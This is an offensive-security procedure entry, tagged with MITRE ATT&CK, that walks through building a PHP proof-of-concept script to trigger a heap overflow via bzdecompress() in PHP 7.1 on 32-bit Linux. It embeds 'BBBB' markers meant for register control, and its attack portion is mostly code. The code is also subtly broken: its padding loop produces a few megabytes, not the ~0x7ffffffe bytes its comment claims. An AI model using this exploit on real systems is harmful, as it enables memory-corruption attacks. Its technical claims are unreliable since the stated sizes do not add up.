---
id: proc-create-php-poc
tags:
  - poc
  - php
  - exploit-development
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:28:20.193Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Create-PHP-POC-Script-to-Trigger-bzdecompress-Overflow

## Summary

This procedure creates a proof-of-concept PHP script that generates an oversized Bzip2 compressed string to exploit the integer overflow in bzdecompress(), causing a heap overflow on 32-bit systems.

## Description

The script bypasses memory limits, constructs a large input string with markers like 'BBBB' for register control, compresses it using bzcompress(), and decompresses it to trigger the overflow. The compressed data is padded and repeated to reach ~0x7ffffffe bytes, exploiting the source_len * 2 calculation. Target: PHP 7.1 on 32-bit Linux. Expected outcome: Crash due to heap write beyond allocated buffer.

## Requirements

1. PHP 7.1 CLI with Bzip2 module
2. Write access to a directory for the script
3. 32-bit system to trigger overflow

## Defense

Defensive measures and detection strategies:

- Validate input sizes before compression/decompression
- Monitor for high memory usage in PHP processes
- Patch PHP to include overflow checks in Bzip2 module

## Objectives

1. Generate input that overflows integer calculation
2. Embed controllable data for exploitation
3. Trigger heap corruption

## Instructions

### Step 1: Set Up Script Environment

**Context**: Initialize the PHP script with unlimited memory to handle large strings.

Create bz_poc.php:

```php
<?php
ini_set('memory_limit', -1);
```

> This allows creation of large strings without PHP's default limits.

### Step 2: Build and Compress Input

**Context**: Construct a large string with repeated 'A's, 'BBBB', and 'C's, then compress and pad it.

Add to script:

```php
$input = str_repeat('A', 1000000) . 'BBBB' . str_repeat('C', 1000000);
$compressed = bzcompress($input, 9);
$oversized = str_repeat($compressed . str_repeat(chr(0), 100), 10000); // ~0x7ffffffe length
```

> Compression reduces size, but repetition creates oversized input for decompression.

### Step 3: Trigger Decompression

**Context**: Call bzdecompress() on the oversized data to invoke the vulnerable allocation.

Add:

```php
$result = bzdecompress($oversized);
echo "Decompressed successfully? " . (isset($result) ? 'Yes' : 'No');
```

> Expected: Crash due to heap overflow during decompression write.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP]]

## Tags

- poc
- php
- heap-overflow
